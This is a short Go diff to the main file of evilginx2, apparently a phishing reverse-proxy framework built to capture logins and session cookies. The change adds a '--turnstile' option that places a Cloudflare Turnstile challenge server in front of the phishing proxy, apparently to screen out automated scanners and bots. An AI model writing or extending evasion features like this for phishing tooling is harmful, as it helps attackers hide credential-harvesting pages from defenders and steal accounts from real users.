@@ -8,6 +8,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"strings"
 
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
@@ -24,6 +25,7 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
+var turnstile = flag.String("turnstile", "", "Turnstile public/private key separated by \":\"")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -170,7 +172,17 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	var hp *core.HttpProxy
+
+	if *turnstile != "" {
+		turnstileParts := strings.Split(*turnstile, ":")
+		hs, _ := core.NewHttpServerTurnstile(turnstileParts[0], turnstileParts[1], true)
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, true)
+		hs.Start(hp)
+	} else {
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, false)
+	}
+
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
